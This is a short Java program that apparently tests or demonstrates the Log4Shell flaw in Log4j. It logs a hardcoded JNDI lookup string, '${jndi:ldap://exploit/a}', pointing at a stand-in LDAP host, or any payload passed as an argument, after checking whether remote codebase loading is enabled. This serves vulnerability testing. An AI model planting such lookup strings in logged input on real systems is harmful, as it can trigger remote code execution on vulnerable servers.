import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


class Example {
    private static Logger logger = LogManager.getLogger();

    public static void main(String... args) throws Exception {
		String message = "${jndi:ldap://exploit/a}";

		if (args.length > 0) {
			message = args[0];
		}

		Thread.sleep(10000);

		logger.info("Starting ...");

		if (System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase").equals("true")) {
			logger.info("RCE possible!!!");
		}

		logger.info(message);

		logger.info("Exiting");
    }
}
